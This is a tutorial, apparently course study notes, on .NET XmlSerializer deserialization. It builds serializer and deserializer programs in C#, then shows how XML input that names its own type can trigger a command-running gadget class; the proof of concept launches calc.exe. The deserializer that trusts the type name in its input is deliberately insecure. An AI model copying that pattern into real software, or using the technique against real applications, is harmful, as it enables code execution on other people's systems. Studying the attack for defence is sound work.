## What is Serialization
The concept of serialization (and deserialization) has existed in computer science for a number of years. 
Its purpose is to convert a data structure into a format that can be stored or transmitted over a network link for future consumption.
Due to its extremely useful nature, serialization is supported in many modern programming languages.
Deserialization as an attack vector in .NET applications has arguably been less discussed than in other languages. 

There are various formats in which the serialized objects can be stored.
we have already suggested a binary format as an option, which in the case of .NET, would likely be handled by the _BinaryFormatter_ class.
We will be discussing the XmlSerializer Class.

## Limitations
Stated in the official document for [XmlSerializer](https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization) class, the _XmlSerializer_ is only able to serialize _public_ properties and fields of an object.
Moreover, the _XmlSerializer_ class supports a narrow set of objects primarily due to the fact that it cannot serialize abstract classes.
Finally, the type of the object being serialized always has to be known to the _XmlSerializer_ instance at runtime, otherwise, a runtime exception will be resulted.

## Examples
We will start by creating our own XmlSerializer and a corresponding deserializer.
The following code in c# will be our serializer:

```c#
using System;
using System.IO;
using System.Xml.Serialization;

namespace BasicXMLSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            MyConsoleText myText = new MyConsoleText();
            myText.text = args[0];
            MySerializer(myText);
        }

        static void MySerializer(MyConsoleText txt)
        {
            var ser = new XmlSerializer(typeof(MyConsoleText));
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\basicXML.txt");
            
            ser.Serialize(writer, txt);
            writer.Close();
        }
    }

    public class MyConsoleText
    {
        private String _text;

        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
            
        }
    }
}
```

Here, Our namespace contains the implementation of the _MyConsoleText_ class which will print out the sentence to the console containing the string that is stored in it's private "\_text" property when its public counterpart is set.

In the main class "Program", we create an instance of the _MyConsoleText_ class and set its "text" property to the string that will be passed on the command line.

Finally, we create an instance of the _XmlSerializer_ class and, we serialize our _myText_ object and save it in the suitable directory.

With our serialization application done, we now turn our focus on the deserialization application:
```c#
using System.IO;
using System.Xml.Serialization;
using BasicXMLSerializer;

namespace BasicXMLDeserializer
{
    class Program
    {
        static void Main(string[] args)
        {
            var fileStream = new FileStream(args[0], FileMode.Open, FileAccess.Read);
            
            var streamReader = new StreamReader(fileStream);
            
            XmlSerializer serializer = new XmlSerializer(typeof(MyConsoleText));
            
            serializer.Deserialize(streamReader);
        }
    }
}
```

Our deserializer application simply creates an instance of the _XmlSerializer_ class using the _MyConsoleText_ object type and then deserializes the contents of our input file into an instance of the original object.

We compile both projects and then proceed to execute the serializer with a string argument:

![](../../03.%20Screenshots/t4-ss1.png)

We get the following output:

```xml
<!--C:\Users\Public>type basicXML.txt-->

<?xml version="1.0" encoding="utf-8"?>
<MyConsoleText xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <text>This is my first serializer</text>
</MyConsoleText>
```

With our serialized object ready, we can now deserialize it with the deserializer application:

![](../../03.%20Screenshots/t4-ss2.png)

The "This is my first serializer" output is the result of the execution of the code present in the _MyConsoleText_ setter method.
The setter of our property was automatically executed during the deserialization of the target object.
This means, in some cases, by using object properties the setters can trigger the execution of additional code during deserialization.
Another interesting aspect is that we would be able to manually change the contents of basicXML.txt in a trivial way, since the serialized object is written in XML format.

## Expanding The Example
The above example was rather rigid, as it only deserialized an object of the type MyConsoleText, because that was hardcoded in the XmlSerializer constructor call.

However, we can make a custom deserializing wrapper that's more flexible to the type of objects and can deserialize multiple types of objects.

The new application will look like as follows:

```c#
using System;
using System.IO;
using System.Xml;
using System.Xml.Serialization;

namespace MultiXMLSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            String txt = args[0];
            int myClass = Int32.Parse(args[1]);

            if (myClass == 1)
            {
                MyFirstConsoleText myText = new MyFirstConsoleText();
                myText.text = txt;
                CustomSerializer(myText);
            }
            else
            {
                MySecondConsoleText myText = new MySecondConsoleText();
                myText.text = txt;
                CustomSerializer(myText);
            }
        }

        static void CustomSerializer(Object myObj)
        {
            XmlDocument xmlDocument = new XmlDocument();
            XmlElement xmlElement = xmlDocument.CreateElement("customRootNode");
            xmlDocument.AppendChild(xmlElement);
            XmlElement xmlElement2 = xmlDocument.CreateElement("item");
            xmlElement2.SetAttribute("objectType", myObj.GetType().AssemblyQualifiedName);
            XmlDocument xmlDocument2 = new XmlDocument();
            XmlSerializer xmlSerializer = new XmlSerializer(myObj.GetType());
            StringWriter writer = new StringWriter();
            xmlSerializer.Serialize(writer, myObj);
            xmlDocument2.LoadXml(writer.ToString());
            xmlElement2.AppendChild(xmlDocument.ImportNode(xmlDocument2.DocumentElement, true));
            xmlElement.AppendChild(xmlElement2);

            File.WriteAllText("C:\\Users\\Public\\multiXML.txt", xmlDocument.OuterXml);
        }
    }

    public class MyFirstConsoleText
    {
        private String _text;

        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My first console text class says: " + _text); }
        }
    }

    public class MySecondConsoleText
    {
        private String _text;

        public String text
        {
            get { return _text; }
            set { _text = value; Console.WriteLine("My second console text class says: " + _text); }
        }
    }
}
```

The application is rather simple and very similar to our previous one, however, this time, instead of only 1 type of object, MyFirstConsoleText, we have another type of object that can be serialized by our application which is MySecondConsoleText.

The most interesting parts of this application are found in the _CustomSerializer_ function.
the information about the type of the object being serialized in a custom XML tag called "item". 
The type of object being serialized is not hardcoded during the instantiation of XmlSerializer class. Instead, the GetType function is being used to get the type of the object dynamically.

For the deserializing application the code is as follows:

```C#
using System;
using System.Diagnostics;
using System.IO;
using System.Xml;
using System.Xml.Serialization;

namespace MultiXMLDeserializer
{
    class Program
    {
        static void Main(string[] args)
        {
            String xml = File.ReadAllText(args[0]);
            CustomDeserializer(xml);            
        }

        static void CustomDeserializer(String myXMLString)
        {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(myXMLString);
            foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
            {
                string typeName = xmlItem.GetAttribute("objectType");
                var xser = new XmlSerializer(Type.GetType(typeName));
                var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
                xser.Deserialize(reader);
            }
        }
    }
}
```

Our new deserializer application needs to be aware of the new classes in order to properly process the serialized objects.
Even though we are not directly instantiation instances of the classes of the serializer, we still need to create a reference to the executable.

Using the serializing application, we get the following output:
```xml
<!--PS C:\Users\Public> \\192.168.253.128\Web300_prep\DotNetNuke\ExpandedXMLSerializer\ExpandedXMLSerializer\bin\x64\Release\ExpandedXMLSerializer.exe "serializing first class..." 1-->

<!--My first console text class says: serializing first class...1-->

<!--PS C:\Users\Public> type .\multiXML.txt-->

<customRootNode>
<item objectType="MultiXMLSerializer.MyFirstConsoleText, ExpandedXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<MyFirstConsoleText xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<text>serializing first class...</text>
</MyFirstConsoleText>
</item>
</customRootNode>

<!--PS C:\Users\Public>-->
```

We can see that the custom item node which contains the object type.

Now let's see what happens when we use the deserializer:

![](../../03.%20Screenshots/t4-ss3.png)

Everything works as expected, however, the interesting part arises, when we can manipulate the XML file, to display so that rather than deserializing the _MyFirstConsoleText_ instance, we can deserialize an instance of _MySecondConsoleText_.

We will edit the xml file to the following:

```xml
<customRootNode>
<item objectType="MultiXMLSerializer.MySecondConsoleText, ExpandedXMLSerializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"><MySecondConsoleText xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<text>serializing first class..</text>
</MySecondConsoleText>
</item>
</customRootNode>
```

Deserializing this, we get the following result:

![](../../03.%20Screenshots/t4-ss4.png)

It works.
However, in this example, we new the required information about the object, to manipulate the output.
Thus, in a white box text, we can get the information about the objects where we have access to the compiled .NET modules, by decompiling them.
One final important step is to determine how can we abuse this particular process.

## Abusing Deserialization Process

To explain the abuse of deserialization, we will consider the following edited deserialize application:

```C#
using System;
using System.Diagnostics;
using System.IO;
using System.Xml;
using System.Xml.Serialization;

namespace MultiXMLDeserializer
{
    class Program
    {
        static void Main(string[] args)
        {
            String xml = File.ReadAllText(args[0]);
            CustomDeserializer(xml);            
        }

        static void CustomDeserializer(String myXMLString)
        {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(myXMLString);
            foreach (XmlElement xmlItem in xmlDocument.SelectNodes("customRootNode/item"))
            {
                string typeName = xmlItem.GetAttribute("objectType");
                var xser = new XmlSerializer(Type.GetType(typeName));
                var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
                xser.Deserialize(reader);
            }
        }
    }

    public class ExecCMD
    {
        private String _cmd;
        public String cmd
        {
            get { return _cmd; }
            set
            {
                _cmd = value;
                ExecCommand();
            }
        }

        private void ExecCommand()
        {
            Process myProcess = new Process();
            myProcess.StartInfo.FileName = _cmd;
            myProcess.Start();
            myProcess.Dispose();
        }
    }
}
```

Our new version of the deserializer application also implements the _ExecCMD_ class. As the name suggests, this class will simply create a new process based on its "cmd" property.
the _cmd_ property setter sets the private property \_cmd based on the value that has been passed and immediately makes a call to the _ExecCommand_ function. 
This is followed by the implementation of the function.

We will now change the XML file to look like so:
```xml
<customRootNode>
<item objectType="MultiXMLDeserializer.ExecCMD, MultiXMLDeserializer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null">
<ExecCMD xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<cmd>calc.exe</cmd>
</ExecCMD>
</item>
</customRootNode>
```

Compiling and running the deserializer:

![](../../03.%20Screenshots/t4-ss5.png)

We get an instance of calc.exe. 
This means as long as we are able to retrieve the class information we need and the target class can be deserialized by the _XmlSerializer_, we can instantiate objects that the original developers likely never intended to be deserialized.